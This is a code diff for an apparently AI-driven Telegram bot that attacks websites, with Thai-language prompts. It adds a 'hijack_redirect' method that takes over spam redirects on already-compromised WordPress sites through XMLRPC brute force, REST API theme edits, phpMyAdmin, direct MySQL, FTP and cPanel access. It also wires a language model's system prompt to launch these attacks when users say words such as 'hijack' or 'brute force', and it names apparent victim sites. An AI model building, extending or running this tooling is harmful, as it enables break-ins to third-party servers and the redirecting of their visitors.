@@ -834,8 +834,8 @@ const AI_TOOLS: Tool[] = [
           redirectUrl: { type: "string", description: "URL ที่จะ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
           method: { 
             type: "string", 
-            enum: ["full_chain", "redirect_only", "scan_only", "agentic_auto", "cloaking_inject"],
-            description: "วิธีโจมตี: full_chain=โจมตีเต็มรูปแบบ, redirect_only=วาง redirect อย่างเดียว, scan_only=สแกนช่องโหว่อย่างเดียว, agentic_auto=AI เลือกวิธีเอง, cloaking_inject=ฝัง PHP cloaking แบบ Accept-Language (เหมือน empleos.uncp.edu.pe)" 
+            enum: ["full_chain", "redirect_only", "scan_only", "agentic_auto", "cloaking_inject", "hijack_redirect"],
+            description: "วิธีโจมตี: full_chain=โจมตีเต็มรูปแบบ, redirect_only=วาง redirect อย่างเดียว, scan_only=สแกนช่องโหว่อย่างเดียว, agentic_auto=AI เลือกวิธีเอง, cloaking_inject=ฝัง PHP cloaking แบบ Accept-Language, hijack_redirect=ยึด redirect ที่มีอยู่แล้ว (XMLRPC brute + PMA + MySQL + FTP + cPanel)" 
           },
         },
         required: ["targetDomain"],
@@ -2026,6 +2026,17 @@ function buildSystemPrompt(context: SystemContext): string {
 - ใช้ external JS บน S3 ทำให้เปลี่ยน redirect URL ได้โดยไม่ต้องแก้ PHP บนเว็บ
 - ต้องมี admin access ของ WordPress ก่อน (ได้จาก scan/exploit ก่อนหน้า)
 ถ้า user บอก "deploy" "วาง" "อัพ" "auto deploy" "วางแล้ว deploy" → เรียก deploy_advanced (สร้าง payloads + deploy ไปยังเว็บอัตโนมัติ)
+ถ้า user บอก "hijack" "ยึด redirect" "เปลี่ยน redirect" "แย่ง redirect" "takeover redirect" "brute force" "XMLRPC" "PHPMyAdmin" → เรียก attack_website ด้วย method: "hijack_redirect"
+
+═══ Hijack Redirect Engine ═══
+วิธีนี้ใช้สำหรับเว็บที่ถูกแฮกไว้แล้ว (มี redirect อยู่) แต่เราต้องการเปลี่ยน redirect ไปที่ของเรา:
+- Method 1: XMLRPC Brute Force — ลอง username/password ผ่าน xmlrpc.php (ใช้ HTTP ไม่ใช่ HTTPS)
+- Method 2: WP REST API Editor — แก้ functions.php ผ่าน REST API
+- Method 3: PHPMyAdmin — เข้า PMA บน port 2030/8080/8443 แล้ว UPDATE wp_options
+- Method 4: MySQL Direct — เชื่อมต่อ MySQL port 3306 โดยตรง
+- Method 5: FTP Access — login FTP port 21 แล้วแก้ไฟล์
+- Method 6: cPanel — เข้า cPanel port 2082/2083 แล้วใช้ File Manager
+ระบบจะ scan port ก่อน แล้วลองทุกวิธีที่ port เปิดอยู่ รายงานผลทุก method
 
 ═══ Advanced Attack Techniques ═══
 เทคนิคขั้นสูง 5 วิธี (จากการวิเคราะห์ qec.numl.edu.pk):
@@ -3288,6 +3299,16 @@ function getAlternativeAttackMethods(failedMethod: string, errorInfo?: { waf?: s
     });
   }
 
+  // Hijack Redirect as alternative (for already-compromised sites)
+  if (failedMethod !== "hijack_redirect") {
+    alternatives.push({
+      method: "hijack_redirect",
+      label: "\uD83D\uDD13 Hijack Redirect",
+      reason: "\u0e22\u0e36\u0e14 redirect \u0e17\u0e35\u0e48\u0e21\u0e35\u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27 \u2014 \u0e25\u0e2d\u0e07 XMLRPC brute + PHPMyAdmin + MySQL + FTP + cPanel (6 \u0e27\u0e34\u0e18\u0e35)",
+      confidence: isWordPress ? "high" : "medium",
+    });
+  }
+
   // Deploy advanced as alternative (generate + deploy in one shot)
   if (!failedMethod.startsWith("deploy_")) {
     alternatives.push({
@@ -3439,6 +3460,7 @@ const METHOD_ETA_MS: Record<string, { min: number; max: number; label: string }>
   advanced_all:        { min: 60_000,  max: 420_000,  label: "~1 - 7 min" },
   deploy_advanced_all: { min: 120_000, max: 480_000,  label: "~2 - 8 min" },
   cloaking_inject:     { min: 30_000,  max: 180_000,  label: "~30s - 3 min" },
+  hijack_redirect:     { min: 60_000,  max: 300_000,  label: "~1 - 5 min" },
 };
 
 function getMethodEta(method: string): { min: number; max: number; label: string } {
@@ -3559,7 +3581,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
   const timings: Array<{ step: string; ms: number; ok: boolean }> = [];
   let stepIndex = 0;
   
-  const totalStepsForMethod = method === "full_chain" ? 7 : method === "agentic_auto" ? 5 : method === "cloaking_inject" ? 5 : 3;
+  const totalStepsForMethod = method === "full_chain" ? 7 : method === "agentic_auto" ? 5 : method === "cloaking_inject" ? 5 : method === "hijack_redirect" ? 8 : 3;
   
   const updateProgress = async (stepName: string, status: "running" | "done" | "failed") => {
     attackEntry.lastUpdate = stepName;
@@ -4047,6 +4069,102 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         );
         await sendAlternativeAttackSuggestions(config, chatId, domain, "cloaking_inject", {
           errorMessage: injectionResult.errors.join("; "),
+        });
+      }
+      
+    } else if (method === "hijack_redirect") {
+      // Hijack Redirect Engine — 6 methods to take over existing redirects
+      await updateProgress("Starting Hijack Redirect Engine", "running");
+      const s1 = Date.now();
+      
+      // Step 1: Get redirect URL
+      const { pickRedirectUrl: pickRedUrl } = await import("./agentic-attack-engine");
+      const hijackRedirectUrl = await pickRedUrl();
+      timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      
+      // Step 2-8: Execute hijack redirect with all 6 methods
+      await updateProgress("Port scanning + trying 6 methods...", "running");
+      const s2 = Date.now();
+      const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+      
+      const hijackResult = await executeHijackRedirect({
+        targetDomain: domain,
+        newRedirectUrl: hijackRedirectUrl,
+      }, async (phase, detail, methodIndex, totalMethods) => {
+        try {
+          attackEntry.lastUpdate = detail;
+          const pct = Math.floor(((stepIndex + methodIndex) / 8) * 100);
+          const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor(pct / 10) ? "\u2588" : "\u2591").join("");
+          await editTelegramMessage(config, chatId, progressMsgId,
+            `\uD83D\uDD13 Hijack Redirect: ${domain}\n\n[${bar}] ${pct}%\n\u0E27\u0E34\u0E18\u0E35: ${phase}\n${detail}`);
+        } catch { /* ignore progress update errors */ }
+      });
+      
+      const hijackMs = Date.now() - s2;
+      stepIndex += 6;
+      
+      // Log each method result
+      for (const mr of hijackResult.methodResults) {
+        timings.push({
+          step: `${mr.methodLabel}: ${mr.success ? "\u2705" : "\u274C"} ${mr.detail.substring(0, 80)}`,
+          ms: mr.durationMs,
+          ok: mr.success,
+        });
+      }
+      
+      // Port scan results
+      const p = hijackResult.portsOpen;
+      timings.push({
+        step: `Ports: FTP=${p.ftp ? "\u2705" : "\u274C"} MySQL=${p.mysql ? "\u2705" : "\u274C"} PMA=${p.pma ? "\u2705" : "\u274C"} cPanel=${p.cpanel ? "\u2705" : "\u274C"}`,
+        ms: 0,
+        ok: true,
+      });
+      
+      await updateProgress("Done", hijackResult.success ? "done" : "failed");
+      
+      // Save attack log
+      const totalDuration = Date.now() - s1;
+      await saveAttackLog({
+        targetDomain: domain,
+        method: "hijack_redirect",
+        success: hijackResult.success,
+        durationMs: totalDuration,
+        redirectUrl: hijackRedirectUrl,
+        aiReasoning: `Hijack Redirect: ${hijackResult.winningMethod || "no method succeeded"}. Tried: ${hijackResult.methodResults.map(m => `${m.method}(${m.success ? "OK" : "FAIL"})`).join(", ")}`,
+        errorMessage: !hijackResult.success ? hijackResult.errors.slice(0, 3).join("; ") : undefined,
+      });
+      
+      // Send completion notification
+      if (hijackResult.success) {
+        let msg = `\uD83D\uDD14 Hijack Redirect \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n`;
+        msg += `\u2705 ${domain}\n`;
+        msg += `\uD83D\uDCA5 Method: ${hijackResult.winningMethod}\n`;
+        msg += `\uD83D\uDD17 New Redirect: ${hijackRedirectUrl.substring(0, 50)}\n`;
+        if (hijackResult.originalRedirectUrl) {
+          msg += `\uD83D\uDD04 Old Redirect: ${hijackResult.originalRedirectUrl.substring(0, 50)}\n`;
+        }
+        msg += `\n\uD83D\uDCCA Methods tried:\n`;
+        for (const mr of hijackResult.methodResults) {
+          msg += `  ${mr.success ? "\u2705" : "\u274C"} ${mr.methodLabel} (${formatDuration(mr.durationMs)})\n`;
+        }
+        msg += `\n\u23F1 ${formatDuration(totalDuration)}`;
+        await sendTelegramReply(config, chatId, msg);
+      } else {
+        let msg = `\uD83D\uDD14 Hijack Redirect \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n`;
+        msg += `\u274C ${domain}\n`;
+        if (hijackResult.redirectPattern) {
+          msg += `\uD83D\uDD0D Current redirect: ${hijackResult.redirectPattern.type} \u2192 ${hijackResult.redirectPattern.currentUrl || "unknown"}\n`;
+        }
+        msg += `\n\uD83D\uDCCA Methods tried:\n`;
+        for (const mr of hijackResult.methodResults) {
+          msg += `  ${mr.success ? "\u2705" : "\u274C"} ${mr.methodLabel}: ${mr.detail.substring(0, 60)}\n`;
+        }
+        msg += `\n\uD83D\uDD0C Open ports: FTP=${p.ftp} MySQL=${p.mysql} PMA=${p.pma} cPanel=${p.cpanel}\n`;
+        msg += `\u23F1 ${formatDuration(totalDuration)}`;
+        await sendTelegramReply(config, chatId, msg);
+        await sendAlternativeAttackSuggestions(config, chatId, domain, "hijack_redirect", {
+          errorMessage: hijackResult.errors.join("; "),
         });
       }
       
